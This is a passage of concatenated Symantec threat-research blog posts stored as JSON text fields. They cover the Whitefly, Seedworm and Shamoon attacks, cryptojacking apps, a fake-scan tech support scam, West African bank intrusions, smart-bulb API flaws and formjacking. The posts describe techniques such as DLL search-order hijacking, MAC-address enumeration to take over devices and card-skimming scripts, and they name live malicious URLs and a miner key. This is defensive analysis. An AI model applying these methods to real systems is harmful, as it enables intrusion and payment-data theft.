organization with information from Symantec’s massive global security telemetry data store to build out the full picture of attacker movement in the organization. Since its inception, TAA has detected security incidents at thousands of organizations, automating what would have taken many hours of analyst time. Examples of additional events that TAA can correlate to attempted credential dumping include: In addition to the detection provided by SEDR, Symantec Endpoint Protection (SEP) uses a variety of technologies to block credential-dumping techniques, including: Alerts from these technologies are displayed in SEP as: Symantec Endpoint Protection and Symantec Endpoint Detection and Response are just two offerings across Symantec's defense-in-depth portfolio that can help identify and block credential theft at various points in the attack chain. Our threat research teams continue to identify new credential dumping techniques being used in both targeted attacks as well ascyber crimeactivity. We look forward to sharing more both about the evolution of these attacks and about how Symantec's broad portfolio protects our customers against them. Trilling holds a B.

    "text": "In July 2018, an attack on Singapore’s largest public health organization, SingHealth, resulted in a reported 1.5 million patient records being stolen. Until now, nothing was known about who was responsible for this attack. Symantec researchers have discovered that this attack group, which we call Whitefly, has been operating since at least 2017, has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. Whitefly compromises its victims using custom malware alongside open-source hacking tools and living off the land tactics, such as malicious PowerShell scripts. From mid-2017 to mid-2018, Whitefly launched targeted attacks against multiple organizations. While most of these organizations were based in Singapore, some were multinational organizations with a presence in Singapore. To date, Whitefly has attacked organizations in the healthcare, media, telecommunications, and engineering sectors. Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image. These files frequently purport to offer information on job openings or appear to be documents sent from another organization operating in the same industry as the victim. Given the nature of disguise, it’s highly likely that they are sent to the victim using spear-phishing emails. If opened, the dropper runs a loader known asTrojan. Vcrodaton the computer. Whitefly has consistently used a technique known as search order hijacking to run Vcrodat. This technique takes advantage of the fact that Windows does not require an application to provide a specific path for a DLL that it wishes to load. If no path is provided, Windows searches for the DLL in specific locations on the computer in a pre-defined order. Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it. Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors. The group leverages search order hijacking to assure that its malicious DLLs will be executed. Targeting security applications could allow the attackers to gain higher privileges for the malware, since the vendor’s component may be run with elevated privileges. Once executed, Vcrodat loads an encrypted payload on to the victim’s computer. The payload contacts a command and control (C&C) domain. Whitefly configures multiple C&C domains for each target. The payload sends system information about the infected computer to the C&C server and downloads additional tools. Whitefly usually attempts to remain within a targeted organization for long periods of time—often months—in order to steal large volumes of information. Once the initial computer on the targeted organization’s network is infected with Vcrodat, Whitefly begins mapping the network and infecting further computers. In order to carry out this operation, it uses publicly available tools, including Mimikatz (Hacktool. Mimikatz) and an open-source tool (SHA2: 263dc5a8121d20403beeeea452b6f33d51d41c6842d9d19919def1f1cb13226c) that exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers. The attackers rely heavily on tools such as Mimikatz to obtain credentials. Using these credentials, the attackers are able to compromise more machines on the network and, from those machines, again obtain more credentials. They perform this tactic repeatedly until they gain access to the desired data. Whitefly usually attempts to remain within a targeted organization for long periods of time—often months—in order to steal large volumes of information. It keeps the compromise alive by deploying a number of tools that facilitate communication between the attackers and infected computers. These tools include a simple remote shell tool that will call back to the C&C server and wait for commands, and an open-source hacking tool called Termite (Hacktool. Rootkit), which allows Whitefly to perform more complex actions such as controlling multiple compromised machines at a time. In some attacks, Whitefly has used a second piece of custom malware,Trojan. Nibatad. Like Vcrodat, Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer. And similar to Vcrodat, the Nibatad payload is designed to facilitate information theft from an infected computer. While Vcrodat is delivered via the malicious dropper, we have yet to discover how Nibatad is delivered to the infected computer. Why Whitefly uses these two different loaders in some of its attacks remains unknown. And while we have found both Vcrodat and Nibatad inside individual victim organizations, we have not found any evidence of them being used simultaneously on a single computer. Some of the tools that Whitefly has used in its attacks have also been deployed in other targeted attacks outside Singapore. Between May 2017 and December 2018, a multi-purpose command tool (SHA2: 7de8b8b314f2d2fb54f8f8ad4bba435e8fc58b894b1680e5028c90c0a524ccd9) that has been used by Whitefly was also used in attacks against defense, telecoms, and energy targets in Southeast Asia and Russia. The tool appears to be custom-built and, aside from its use by Whitefly, these were the only other attacks where Symantec has observed its use. In another case, Vcrodat was also used in an attack on a UK-based organization in the hospitality sector. It's possible Whitefly itself performed these attacks but it’s more likely that they were carried out by one or more other groups with access to the same tools. It now appears that the SingHealth breach was not a one-off attack and was instead part of a wider pattern of attacks against organizations in the region. Whitefly is a highly adept group with a large arsenal of tools at its disposal, capable of penetrating targeted organizations and maintaining a long-term presence on their networks. Links with attacks in other regions also present the possibility that it may be part of a broader intelligence gathering operation. Symantec has the following protection in place to protect customers against these attacks: File-based protection The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "Like flies to honey, miscreants are drawn to the latestcyber crimethat promises quick bucks with minimal effort. Ransomware and cryptojacking have had their day in the sun with the get-rich-quick criminals, and now it’s formjacking’s turn. In this year’sInternet Security Threat Report (ISTR) Volume 24, we share the latest insights into global threat activity, cyber criminal trends, and attacker motivations. This year's report notably reveals formjacking—where infected web servers skim off consumers' payment information—has emerged as the breakthrough threat of 2018. This threat showed explosive growth—and potentially big profits—at the end of the year, ensuring that it's likely to draw plenty of flies in 2019 and beyond. Often using third-party apps to infiltrate websites, formjacking also further illustrates the dangers of supply chain attacks, a growing weakness we first warned of in last year's report. Requiring only a few simple lines of code loaded onto a website, formjacking represents a significant threat to online retailers, or anyone who collects personally identifiable information from their customers via their website. This year's report notably reveals formjacking—where infected web servers skim off consumers’ payment information—has emerged as the breakthrough threat of 2018. While no longer easy money, ransomware and cryptojacking have not gone away. The ISTR shows that with the decline in the value of cryptocurrencies, getting rich quickly through cryptojacking isn't as easy as before, and some attackers have moved on to more lucrative activities. But attacks are easy to instigate and manage, meaning those criminals playing the long game can still make money. Overall, Symantec blocked four times as many cryptojacking attacks last year than in 2017, and it continues to persist as an active threat so far this year. Ransomware still offers the opportunity to make large sums of money. The SamSam gang is estimated to have made $6 million from their ransomware attacks. In fact, ransomware actors are increasingly narrowing in on enterprises, a high-value target. Ransomware infections grew in enterprise environments by 12 percent, while consumer infections declined. Consumers likely benefited due to their growing use of mobile devices, as criminals favor Office email attachments and PowerShell scripts—which don't work as well on mobile devices—to carry out ransomware attacks. Yet the threat landscape is not just about crime and the quest for cash. Nation-states quickly adopted the internet for espionage and have used it for destructive purposes. Late last year,Shamoon notably reemerged after a two-year absence, deploying wiping malware to delete files on computers of targeted organizations in the Middle East. Nearly one in ten targeted attack groups now use malware to destroy and disrupt business operations, a 25 percent increase from the previous year. They also continue to refine their attack techniques, favoring spear phishing over zero days and using living off the land techniques to maintain a low profile and hide their attacks in a sea of legitimate IT processes. Nearly one in ten targeted attack groups now use malware to destroy and disrupt business operations, a 25 percent increase from the previous year. In fact, Symantec'sTargeted Attack Analytics (TAA)technology discovered an attack group calledGallmakerin 2018 that needed no malware at all to infiltrate its targets. As attackers continue to use our own tools against us, detection must evolve from identifying malware to determining intent. Solutions based on machine learning and advanced artificial intelligence, like TAA, are increasingly critical for detecting attacks. It seems that no one would willingly carry on their person a device that would allow someone to spy on their every thought, conversation, and movement. But the headlines of today indicate that we do. That device is our smartphone, and it's not just spymasters seeking out information about us. Even legitimate applications are spying on us. To help understand the risks involved, Symantecanalyzed the top 100 Android and iOS applicationsin 2018 and found nearly half of Android apps and one-quarter of iOS apps requested location tracking. Apps asked for phone numbers, email addresses, access to cameras, microphones, photos, and any personal data stored on the device. That these applications want information about us—far beyond the needs of the application itself—is clear. What to do about it is not as clear, but it starts with understanding the extent of the problem. No blog can sufficiently cover the threat landscape, but the ISTR can.

    "text": "On January 17, we discovered several potentially unwanted applications (PUAs) on the Microsoft Store that surreptitiously use the victim’s CPU power to mine cryptocurrency. We reported these apps to Microsoft and they subsequently removed them from their store. The apps—which included those for computer and battery optimization tutorial, internet search, web browsers, and video viewing and download—came from three developers: DigiDream, 1clean, and Findoo. In total, we discovered eight apps from these developers that shared the same risky behavior. After further investigation, we believe that all these apps were likely developed by the same person or group. Users may get introduced to these apps through the top free apps lists on the Microsoft Store or through keyword search. The samples we found run on Windows 10, including Windows 10 S Mode. As soon as the apps are downloaded and launched, they fetch a coin-mining JavaScript library by triggering Google Tag Manager (GTM) in their domain servers. The mining script then gets activated and begins using the majority of the computer’s CPU cycles to mine Monero for the operators. Although these apps appear to provide privacy policies, there is no mention of coin mining on their descriptions on the app store. The apps were published between April and December 2018, with most of them published toward the end of the year. Even though the apps were on the app store for a relatively short period of time, a significant number of users may have downloaded them. Although we can’t get exact download or installation counts, we can see that there were almost 1,900 ratings posted for these apps. However, app ratings can be fraudulently inflated, so it is difficult to know how many users really downloaded these apps. These apps’ domains are hardcoded in their app manifest file, as shown in Figure 2. When each app is launched, the domain is silently visited in the background and triggers GTM with the key GTM-PRFLJPX, which is shared across all eight applications. GTM is a legitimate tool that allows developers to inject JavaScript dynamically into their applications. However, GTM can be abused to conceal malicious or risky behaviors, since the link to the JavaScript stored in GTM ishttps://www.googletagmanager.com/gtm.js?id={GTM ID}which doesn’t indicate the function of the code invoked. By monitoring the network traffic from these apps, we found that they all connect to the following remote location, which is a coin-mining JavaScript library:http://statdynamic.com/lib/crypta.js The apps then access their own GTM and activate the mining script. Crypta.js is an encrypted JavaScript library, as shown in Figure 4. After we decoded it, we found that it was a version of the Coinhive library. Coinhive is a script that mines Monero. Since the Coinhive service was launched in September 2017, there have been many reports of it being used for cryptojacking without site visitors' knowledge. We also investigated the miner activation code on GTM, and the key source code is shown in Figure 5. We observed that the miner crawls with the keyda8c1ffb984d0c24acc5f8b966d6f218fc3ca6bda661, which serves as the wallet for Coinhive. These apps fall under the category of Progressive Web Applications, which are installed as a Windows 10 app running independently from the browser, in a standalone (WWAHost.exe process) window. From the apps’ network traffic, we found the hosting server for each app. Through a Whois query, we found that all of these servers actually have the same origin. Therefore, these apps were most likely published by the same developers using different names. We have informed Microsoft and Google about these apps’ behaviors. Microsoft has removed the apps from their store. The mining JavaScript has also been removed from Google Tag Manager. Stay protected from online threats and risks by taking these precautions: Symantec and Norton products detect the apps and the JavaScript cryptocurrency miner, respectively, as the following: Join us for a digital news event to hear how Symantec and our partners are working together to drive down the cost and complexity of cyber security, while protecting enterprises against sophisticated threats.

We have seen in recent months how these scams are constantly evolving, from the use ofcall optimizationto the use ofAdvanced Encryption Standard(AES) and amulti-level obfuscation scheme.

Once on the call, a purported support executive would ask the victim for remote access to their computer and then charge a fee for the supposed cleaning they did. While scammers' playbooks remain more or less the same, we have recently seen how scammers are now tricking victims into installing a potentially unwanted application (PUA), rather than urging them to call a support helpline. Toward the end of 2018, we observed a tech support scam campaign that displays a fake Windows alert, warning the victim that their computer might be infected. The scam prompts the victim to approve a supposedly quick 10-second scan of their computer. Once the user clicks OK, the scammers pull off a highly convincing but fake system scan that is almost identical to Norton Security's. We will provide details on how exactly the scammers pull this off later in this blog. At the end of the fake scan, the victim is informed that their PC is indeed infected and then asked to download and install an update to their antivirus software. Upon clicking Proceed, a potentially unwanted application (PUA) is downloaded and installed onto the victim's computer. Just like most tech support scams, this one typically begins after the user visits a malicious website, or is redirected to one through malvertising or a compromised website. We went through the scam's source code to see how this fake scan trickery was achieved. The code contains HTML div elements with the display property set to \"none\", as shown in Figure 3. This setting of display property ensures that the div element is not visible to the victim as soon as the page loads. Moving forward, we see JavaScript code, as shown in Figure 4. The setTimeout() method calls a function or evaluates an expression after a specified number of milliseconds. When the script shown in Figure 4 starts executing, it will first change the display style of the div to \"block\" after two seconds, thereby making the div visible to the victim. The scammer progressively increases the time period for the subsequent calls to the setTimeout() function. This makes the \"windows\" appear on top of each other, one after the other, on the front end. Thus, the victim first sees the start of the scan process, followed by the intermediate in-progress scan graphics, and finally the graphic box, which displays that the system is infected. In Figure 4, we can see some values being assigned to different HTML elements via JavaScript. For example, the element \"cnt1\" is being assigned a value of 218, \"path1\" is assigned a value of \"C:\\Windows\\System32\\sihost.exe\", and so on. These are the values for the number of files scanned and the current file being scanned as it appears on the front end. The scammer cleverly makes use of the setTimeout() function to change these values over a period of time, giving the victim the illusion that an actual scan is in progress and that their files are being scanned. The scammer cleverly makes use of the setTimeout() function to change values over a period of time, giving the victim the illusion that an actual scan is in progress and that their files are being scanned. In this scam, the scammer does not force the victim to call a support helpline, but rather tricks the victim into downloading a PUA. Typically, a PUA comes bundled with other intended software and gets installed along with the intended software. PUAs have been known to perform the following actions on the computer: In a typical tech support scam revenue-generation model, the scammer is dependent on the victim calling the support helpline to earn revenue. However, in this case, we have observed that the malicious code keeps track of the number of victims who are tricked into installing the PUA. In this scenario, the scammer earns revenue by maximizing the number of PUA installs. Digging into our telemetry, we located an unsecured attacker dashboard, which shows the revenue distribution for this model. In Figure 6, we can clearly see the number of clicks generated by each traffic source and the corresponding returns on investment (ROI) from these sources. This model is similar to that used in the exploit kit (EK) space, where malware authors use EKs as a mechanism to deliver their malware to more and more victims and thereby maximize their profit. In the past few weeks, we have also seen similar tech support scams that follow the PUA revenue-generation model. One such scam tricks the victim into believing that their Windows drivers are not updated and asks them to download and install the \"latest drivers\", which are actually PUAs. If this new model proves more profitable than the helpline route down the road, we are likely to see its adoption increase among scammers. Know what's real from fake. Even though the \"Norton\" scan looks almost indistinguishable from the real one, there are many attributes that easily indicate it is fake: Symantec proactively protects customers against tech support scams. Our intrusion prevention system (IPS) technology protects customers by blocking malicious network activity associated with such scams using a wide variety of detections. In the last quarter of 2018, Symantec's IPS blocked more than 89 million tech support scams.

    "text": "Banks and other financial institutions in a number of West African countries have been targeted bycyber criminalsemploying a range of commodity malware and living off the land tools. The attacks have been underway since at least mid-2017. To date, organizations in Cameroon, Congo (DR), Ghana, Equatorial Guinea, and Ivory Coast have been affected. Who is behind these attacks remains unknown. They could be the work of a single group or, more likely, several different groups employing similar tactics. Symantec has observed four distinct attack campaigns directed against financial targets in Africa. The first has been underway since at least mid-2017 and has targeted organizations in Ivory Coast and Equatorial Guinea. The attackers infected victims with commodity malware known as NanoCore (Trojan. Nancrat) and were also observed using PsExec, a Microsoft Sysinternals tool used for executing processes on other systems, on infected computers. Lure documents used by the attackers referred to a West African bank which has operations in several countries in the region. Some tools used in these attacks are similar to tools mentioned in a 2017 SWIFT alert, indicating the attackers may have been attempting to perform financial fraud. The second type of attack began in late 2017 and targeted organizations in Ivory Coast, Ghana, Congo (DR), and Cameroon. The attackers used malicious PowerShell scripts to infect their targets and also used the credential-stealing tool Mimikatz (Hacktool. Mimikatz). They also made use of UltraVNC, an open-source remote administration tool for Microsoft Windows. The attackers then infected computers with the commodity malware known as Cobalt Strike (Trojan. Agentemis) which is capable of opening a backdoor on the computer, communicating with a command and control (C&C) server, and downloading additional payloads. Communication with the C&C server was handled by dynamic DNS infrastructure, which helped shield the location of the attackers. The third type of attack was directed against an organization in Ivory Coast. This organization had also been targeted by the second campaign. This second attack also involved the use of commodity malware, in this case the Remote Manipulator System RAT (Backdoor. Gussdoor), alongside Mimikatz and two custom Remote Desktop Protocol (RDP) tools. Since Mimikatz can be used to harvest credentials and RDP allows for remote connections to computers, it’s likely the attackers wanted additional remote access capability and were interested in moving laterally across the victim’s network. The fourth type of attack began in December 2018 and was directed against organizations in Ivory Coast. The attackers used off-the-shelf malware known as Imminent Monitor RAT (Infostealer. Hawket). All four attack types were first discovered through alerts generated by Symantec’sTargeted Attack Analytics (TAA). TAA leverages advanced artificial intelligence to analyze Symantec’s data lake of telemetry in order to spot patterns associated with targeted attacks. A growing number of attackers in recent years are adopting “living off the land” tactics—namely the use of operating system features or network administration tools to compromise victims' networks. By exploiting these tools, attackers hope to hide in plain sight, since most activity involving these tools is legitimate. However, in each case, a TAA alert was triggered by the attackers maliciously using a legitimate tool. In short, the attackers' use of living off the land tactics led to the discovery of their attacks. Whether the attacks were the work of one or more groups remains unknown. However, they share some commonalities in terms of the tools and tactics employed. Any malware used was off-the-shelf, commodity malware: Cobalt Strike, Imminent Monitor RAT, NanoCore RAT, Remote Manipulator System RAT, and Mimikatz. Additionally, most of the attacks leveraged living off the land tactics, making use of tools such as PowerShell, PsExec, UltraVNC, and RDP. Commodity malware is readily available on the cyber underground. While it may not be as powerful or stealthy as custom-developed tools, it does add a certain level of anonymity to attacks, making it harder to link attacks together and attribute them to any one group of attackers. Until now, Symantec has seen relatively little evidence of these kinds of attacks against the financial sector in West Africa. However, it now appears that there is at least one (and quite possibly more) groups actively targeting banks in the region. Symantec has the following protection in place to protect customers against these attacks: The following list of indicators of compromise is related to African banking attacks. It is likely that these indicators are used by multiple different actors.

    "text": "Internet of Things (IoT) devices for the home continue to be popular, and many people may be considering buying more smart home gadgets this Christmas. It seems that every device now has a smart version that can be integrated into the home network, from microwaves to showers, from heating to smoke detectors. Symantec constantly analyzes the risks associated with IoT devices and their various possible attack vectors. Recently, while looking at new threats to IoT devices, we came across some security issues in a remote-controlled, full-color LED light bulb. It’s a low-priced brand that can be bought at many online stores and is easy to use and integrate with popular voice-activated smart assistants. In order to set up and use the light bulb to its full extent, the user has to install a smartphone app and create a free account. The light bulb will then be added to the local Wi-Fi network and can be controlled remotely through the internet. The first thing we noticed while analyzing the network traffic was that the smartphone application was mostly using plain HTTP requests to interact with the backend in the cloud. Only a few requests, for example to register a new user or to log in, were sent encrypted over HTTPS. Unfortunately, some of the unencrypted requests contained a lot of private information. For example, when the user decides to change the internal name of a light bulb, an unencrypted POST request is sent with the user’s email address in cleartext and the MD5 hash of the unsalted password. This means that anyone with access to the network could potentially sniff this traffic and brute-force the password hash. If the password is not very complex, there is a very good chance for the attacker to crack it. To make matters worse, the application does not provide an option to change the password; once the user has chosen one, it is fixed. Equipped with this data, an attacker could log into the account and take over all of the user’s light bulbs. Unfortunately, some of the unencrypted requests contained a lot of private information. Anyone in the network path could potentially sniff this traffic and brute-force the password hash. This is not the only device where we have seen information being sent in cleartext. Unfortunately, the use of unencrypted traffic is still very common with many devices and applications. The API on the backend allows a user to find the user account that is associated with a specific light bulb by sending the MAC address of that device. There is no verification to determine whether the user account used to query a device is actually associated with that device. Therefore, an attacker only needs an active session that has already been authenticated, and can then guess or brute-force the MAC address of a target device. This method allows an attacker to enumerate all possible MAC addresses for the vendor in question and find any light bulb that is activated and remotely controllable. For each device that is found, the attacker receives the unique ID and the user’s email address in cleartext. The request is a simple GET request over plain HTTP. An attacker could use this trick to gather valid email addresses and use them in further attacks, such as spam, or use the gathered information to attack the light bulb itself. Once a remote-controllable device is found, an attacker can interact with the device. This action does not require knowledge of the password. Similar to the enumeration weakness, all that is required is an authenticated session and the MAC address of the device. Each light bulb can be controlled by multiple users and can therefore also be linked to multiple accounts. Once the connection is established, the attacker can turn the lights off or on, change the color, or rename it. The attacker gains full control over the lights, just like it was their own home. The vendor did previously upgrade the applications to use a more secure API function that requires a security token. Unfortunately, for legacy reasons, the old API is still accepting the unsecure requests. Once the connection is established, the attacker can turn the lights off or on, change the color, or rename it. The attacker gains full control over the lights, just like it was their own home. This is just one example showcasing that there are still a lot of simple security gaps within IoT devices that need to be fixed. Fancy exploits are not always required to take over such devices. Sometimes, as demonstrated in this case, simple design mistakes can be enough to expose users’ private data and devices to the public internet. Anyone could have taken over these smart light bulbs and controlled them. As of this writing, we do not have any indication that these devices have been exploited in the wild. We have reported all findings to the manufacturer. Other researchers have also found related issues with similar products. And of course, there are more possible attack vectors, even with these light bulbs, that we have not covered in this blog. Buyers of such IoT devices need to be aware of the potential risks they expose themselves to. As attacks go, having your smart light bulbs remotely controlled by an attacker might not be so severe, but it could be unsettling nonetheless, and it could be only the first step in a bigger attack scenario. Thus, make sure to follow some of these basic guidelines when installing smart devices over the holiday season, so attackers will not be able to turn off your Christmas lights: Candid Wueest works for Symantec's Security Technology and Response (STAR) division.

    "text": "After a two-year absence, the destructive malware Shamoon (W32. Disttrack. B)re-emerged on December 10 in a new wave of attacks against targets in the Middle East. These latest Shamoon attacks are doubly destructive, since they involve a new wiper (Trojan. Filerase) that deletes files from infected computers before the Shamoon malware wipes the master boot record. News of the attacks first emerged on December 10 when Italian oil services firm Saipem said that it had beenhit by a cyber attackagainst its servers in the Middle East. Two days later,the company saidthat Shamoon had been used in the attack, which affected between 300 and 400 servers and up to 100 personal computers. Symantec has found evidence of attacks against two other organizations during the same week, in Saudi Arabia and the United Arab Emirates. Both organizations are involved in the oil and gas industry. Unlike previous Shamoon attacks, these latest attacks involve a new, second piece of wiping malware (Trojan. Filerase). This malware will delete and overwrite files on the infected computer. Shamoon itself will meanwhile erase the master boot record of the computer, rendering it unusable. The addition of the Filerase wiper makes these attacks more destructive than use of the Shamoon malware alone. While a computer infected by Shamoon could be unusable, files on the hard disk may be forensically recoverable. However, if the files are first wiped by the Filerase malware, recovery becomes impossible. Filerase is spread across the victim’s network from one initial computer using a list of remote computers. This list is in the form of a text file and is unique to each victim, meaning the attackers likely gathered this information during an earlier reconnaissance phase of the intrusion. This list is first copied by a component called OCLC.exe and passed on to another tool called Spreader.exe. The Spreader component will then copy Filerase to all the computers listed. It will then simultaneously trigger the Filerase malware on all infected machines. It is possible that the Shamoon malware itself was spread via these same tools, but this is unknown. In at least one instance, Shamoon was executed using PsExec, indicating that the attackers had access to credentials for the network. One of the new Shamoon victims Symantec observed the organization in Saudi Arabia had recently also been attacked by another group Symantec calls Elfin (aka APT33) and had been infected with the Stonedrill malware (Trojan. Stonedrill). There were additional attacks against this organization in 2018 that may have been related to Elfin or could have been the work of yet another group. The proximity of the Elfin and the Shamoon attacks against this organization means it is possible that the two incidents are linked. Shamoon (W32. Disttrack)first emerged in 2012when it was used in a series of disruptive attacks against the Saudi energy sector. Activity then ceased until it madea surprise comeback in late 2016. A slightly modified version of the malware (W32. Disttrack. B)was used in attacks against a range of targets, again in Saudi Arabia. The attacks appeared timed to cause maximum destruction. The malware was configured to trigger at 8:45pm local time on Thursday, November 17, 2016. The Saudi working week runs from Sunday to Thursday, meaning computers were wiped after most staff had left for the weekend, minimizing the chance of discovery before the attack was complete. Why Shamoon has suddenly been deployed again remains unknown. However, the fact that the malware seems to be taken out of retirement every few years means that organizations need to remain vigilant and ensure that all data is properly backed up and a robust security strategy is in place. Symantec has the following protections in place against the Shamoon attacks: File-based protections Network-based protections (Intrusion Prevention System) Customers of the DeepSight IntelligenceManaged Adversary and Threat Intelligence(MATI) service have received reports on Shamoon which detail methods of detecting and thwarting activities of this adversary..

    "text": "Symantec researchers have uncovered extensive insights into a cyber espionage group behind a recent series of cyber attacks designed to gather intelligence on targets spread primarily across the Middle East as well as in Europe and North America. The group, which we call Seedworm (aka MuddyWater), has been operating since at least 2017, with its most recent activity observed in December 2018. Analysts in ourDeepSight Managed Adversary and Threat Intelligence(MATI) team have found a new backdoor,Backdoor. Powemuddy, new variants of Seedworm’s Powermud backdoor (aka POWERSTATS), a GitHub repository used by the group to store their scripts, as well as several post-compromise tools the group uses to exploit victims once they have established a foothold in their network. In September 2018, we found evidence of Seedworm and the espionage groupAPT28(aka Swallowtail, Fancy Bear), on a computer within the Brazil-based embassy of an oil-producing nation. Seeing two active groups piqued our interest and, as we began pulling on that one string, we found more clues that led us to uncover new information about Seedworm. We not only found the initial entry point, but we were able to follow Seedworm’s subsequent activity after the initial infection due to the vast telemetry Symantec has access to via its Global Intelligence Network. Because of this unique visibility, our analysts were able to trace what actions Seedworm took after they got into a network. We found new variants of the Powermud backdoor, a new backdoor (Backdoor. Powemuddy), and custom tools for stealing passwords, creating reverse shells, privilege escalation, and the use of the native Windows cabinet creation tool, makecab.exe, probably for compressing stolen data to be uploaded. DeepSight MATIcustomers can leverage these unique insights to combat emerging cyber threats. Seedworm’s motivations are much like many cyber espionage groups that we observe—they seek to acquire actionable information about the targeted organizations and individuals. They accomplish this with a preference for speed and agility over operational security, which ultimately led to our identification of their key operational infrastructure. Seedworm likely functions as a cyber espionage group to secure actionable intelligence that could benefit their sponsor’s interests. During the operations, the group used tools consistent with those leveraged during past intrusions including Powermud, a custom tool used by the Seedworm group, and customized PowerShell, LaZagne, and Crackmapexec scripts. The Seedworm group controls its Powermud backdoor from behind a proxy network to hide the ultimate command-and-control (C&C) location. The Seedworm group is the only group known to use the Powermud backdoor. After compromising a system, typically by installing Powermud or Powemuddy, Seedworm first runs a tool that steals passwords saved in users’ web browsers and email, demonstrating that access to the victim's email, social media, and chat accounts is one of their likely goals. Seedworm then uses open-source tools such as LaZagne and Crackmapexec to obtain Windows authorization credentials. Seedworm uses off-the-shelf, unmodified versions of these tools as well as custom-compiled variants which we have determined are only used by this group. Since its existence first came to light, we’ve seen Seedworm modify the way it operates. Since early 2017, they have continually updated their Powermud backdoor and other tools to avoid detection and to thwart security researchers analyzing the tools. They’ve also used GitHub to store malware and a handful of publicly available tools, which they then customize to carry out their work. We have identified multiple online accounts that are likely associated with actors behind the Seedworm operations. The first finding was a public Github repository containing scripts that very closely match those observed in Seedworm operations. An additional link was then made to a persona on Twitter with similar profile data. This Twitter account follows numerous security researchers, including those who have written about the group in the past as well as developers who write the open-source tools they use. These accounts are likely controlled by the Seedworm group. The Github repository contains a PowerShell script that has been run on victim hosts in activity attributed to Seedworm; there are also numerous Crackmapexec PowerShell commands that match victim host activity. Choosing to rely on publicly available tools allows Seedworm to quickly update their operations by using code written by others and applying only small customizations. And they appear to adopt some of the most effective and capable tools, several of which—for these reasons—are also used by red team organizations. We analyzed data on 131 victims that were compromised by Seedworm’s Powermud backdoor from late September to mid-November 2018. Observed Seedworm victims were located primarily in Pakistan and Turkey, but also in Russia, Saudi Arabia, Afghanistan, Jordan, and elsewhere. Additionally, the group compromised organizations in Europe and North America that have ties to the Middle East. Additionally, during our analysis of Powermud victims, we were able to identify the probable industry sector for 80 of the 131 unique victims. The telecommunications and IT services sectors were the main targets. Entities in these sectors are often \"enabling victims\" as telecommunications providers or IT services agencies and vendors could provide Seedworm actors with further victims to compromise. Successfully compromising victims in these two industries provides additional clues about the sophistication and skills of the Seedworm group. The next most common group of victims was in the oil and gas sector. All 11 victims in this group belong to one Russian firm that is active in the Middle East. Only one of these 11 victims was physically located in Russia; the rest were spread out across North America, the Middle East, Africa, and Asia. Universities and embassies were the next most common targets. The universities were in the Middle East and the embassies were primarily based in Europe representing Middle East countries. Two major non-governmental organizations (NGOs) were also compromised; we identified seven victims who worked within these global public health organizations. Symantec has notified the appropriate public and private sector partners regarding Seedworm’s latest targets, tools and techniques.. The following protections are in place to protect customers against Seedworm attacks: File-based protection Network-based protection The following indicators are specific to Seedworm: Symantec’s managed adversary and threat intelligence (MATI) team of intelligence analysts & researchers are dedicated to understanding the adversary ecosystem and providing insightful customer reports detailing their plans, tactics, tools, and campaigns.

    "text": "Formjacking, the use of malicious JavaScript code to steal credit card details and other information from payment forms on the checkout webpages of e-commerce sites, has been making headlines lately. In ourprevious blog, we discussed how formjacking generally works and cited a few publicly reported attacks that targeted popular online businesses. In this blog, we look at the more technical aspects of formjacking and detail a new campaign affecting a number of top shopping sites. Recently, we came across a website of a retail store in Paris which was injected with a formjacking script (Figure 1). The code shown in Figure 1 collects the payment information entered by users on the website and posts it to the domaingoogle-analyitics.org. This domain is a typo-squatted version of the legitimate Google Analytics domain,google-analytics.com. This was no new occurrence for us, considering the number of payment information-stealing script injections we see daily. However, digging into our telemetry, we came across an interesting pattern. We observed popular websites from different countries—such as the U. S., Japan, Australia, and Germany—redirecting to this one Paris website. This created an interesting redirection chain as customers of all these websites were being infected by formjacking at the same time. Figure 2 shows how this infection chain works. In a few cases, even all the regional websites of one brand were affected, redirecting to the same Paris website. We have been able to identify over 30 popular websites affected by this new infection wave, including fashion stores, educational websites, websites selling sports gear, etc. Looking at our telemetry, we can confirm that this campaign has been around since at least November 25, 2018. To make matters worse, another piece of injected code on the same web page looks for the presence of debugging tools, such as Firebug, to thwart security researchers analyzing the malicious script. This latest formjacking campaign highlights the fact that attackers are continuously altering and improving their malicious code and exploring new delivery mechanisms to infect more users. This attack chain is unique in the sense that it differs from the prevalent supply chain formjacking attack, where attackers compromise popular third-party script library providers. As these scripts are loaded by many websites, with one compromise the attacker manages to load their malicious code on a large number of websites all at the same time. In our scenario, the redirecting website and the compromised website in many cases come from different areas of the online shopping landscape, dealing in entirely different product spaces. Symantec is currently notifying and working with the affected retailers to help address this issue, so we won’t be naming them here. This latest formjacking campaign highlights the fact that attackers are continuously altering and improving their malicious code and exploring new delivery mechanisms to infect more users. In addition to the code previously mentioned, we have seen many other scripts injected into websites to steal payment information in various ways. For example, the code shown in Figure 4 was injected into one set of affected websites. The script creates a script element and sets its source tohttps://apitstatus.com/api.js?v=3.0.8. This forces the browser to load malicious obfuscated JavaScript fromapitstatus.com, which in turn collects the entered payment information and posts it back to the attackers’ domain. On yet another set of websites, we discovered the code shown in Figure 5. This obfuscated script applies a hook onto forms on the website and collects all the information entered by visitors. The script also extracts the URL loaded in the browser and determines if the checkout page of the website is loaded. If it has, the script sends the collected form information, which is now the payment information, back to the attacker-controlled domain. This version of a formjacking script was used in various high-profile breaches such as Ticketmaster UK, Shopper Approved, and Feedify. In recent months, we have seen a major uptick in formjacking attacks against high-profile websites across the globe. From our telemetry, we have also observed locally popular websites (those with an Alexa Rank of less than 5,000 in a particular country) in the U. S., Japan, Germany, and Australia, among other countries, being injected with formjacking scripts. Symantec’s Intrusion Prevention System (IPS) technology proactively protects website users from formjacking attacks. In the past three months alone, IPS has blocked more than 1 million formjacking attempts on more than 10,000 unique websites. Taking into account supply chain attacks, which can allow attackers to gain access to large companies by exploiting weaknesses in smaller businesses used by the larger company to provide different services, we can easily say that the actual number of infected websites is bound to be higher. Victims may not realize they are victims of formjacking, as generally their websites continue to operate as normal, and attackers are sophisticated and 